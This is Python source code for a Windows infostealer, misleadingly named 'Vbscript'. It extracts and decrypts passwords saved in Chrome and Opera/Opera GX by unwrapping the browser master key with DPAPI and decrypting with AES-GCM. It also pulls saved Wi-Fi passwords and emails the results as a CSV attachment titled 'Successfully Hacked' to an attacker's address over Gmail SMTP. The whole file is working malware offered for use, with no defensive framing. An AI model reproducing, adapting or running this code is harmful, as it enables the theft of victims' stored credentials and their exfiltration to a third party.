from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from email import encoders
import smtplib, ssl, os, json, base64, win32crypt
from psutil import net_if_addrs
from get_wifi import get_wifi_password

path_local = r'AppData\Local\Google\Chrome\User Data\Local State'

class Vbscript:
    def __init__(self, 
        from_email:str, 
        from_password:str, 
        to_email:str, 
        server:str='smtp.gmail.com', 
        port:int=587) -> None:
        
        self._email_from = from_email
        self._password = from_password
        self._email_to = to_email
        self._server = server
        self._port = port
    
    # chrome
    def get_chrome(self, chrome):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome)

    def get_password(self):
        with open(os.environ['userprofile'] + os.sep + path_local, 'r', encoding='utf-8') as get_path:
            local = get_path.read()
            local = json.loads(local)
        key_master = base64.b64decode(local['os_crypt']["encrypted_key"])
        key_master = key_master[5:]
        key_master = win32crypt.CryptUnprotectData(key_master, None, None, None, 0)[1]
        return key_master

    def decrypt_payload(self, secret, payload):
        return secret.decrypt(payload)

    def on_secret(self, aes_key, ivs):
        return AES.new(aes_key, AES.MODE_GCM, ivs)

    def decrypt_password(self, buff, key_master):
        try:
            ivs = buff[3:15]
            payload = buff[15:]
            secret = self.on_secret(key_master, ivs)
            decrypted_passwd = self.decrypt_payload(secret, payload)
            decrypted_passwd = decrypted_passwd[:-16].decode()
            return decrypted_passwd
        except Exception:
            return 
    
    def wifi(self):
        checked_interface = net_if_addrs()
        for check in checked_interface:
            if 'Wi-Fi' in check:
                get_wifi_password()
            return
    # send email
    def send_email(self):
        msg = MIMEMultipart()
        msg['Subject'] = 'Successfully Hacked'
        msg['From'] = self._email_from
        msg['To'] = self._email_to
        try:
            files = open('fuckyou.csv', 'rb')
            att = MIMEBase('application', 'octet-stream')
            att.set_payload(files.read())
            encoders.encode_base64(att)
            att.add_header(
                'Content-Disposition', 'attachment; filename=fuckyou.csv'
            )
            files.close()
            msg.attach(att)
            
        except Exception:
            return
        
        context = ssl.create_default_context()
        with smtplib.SMTP(self._server, port=self._port) as smtp:
            try:
                smtp.starttls(context=context)
                smtp.login(self._email_from, self._password)
                smtp.sendmail(msg['From'], msg['To'], msg.as_string())
            except Exception:
                return
            
    # opera or opera GX
    def get_encryption_key():
        try:
            try:
                local_state_path = os.path.join(os.environ["userprofile"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")
            except:
                local_state_path = os.path.join(os.environ["userprofile"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
        except FileNotFoundError:
            return

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password_OP(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except Exception:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except Exception as Err:
                return Err
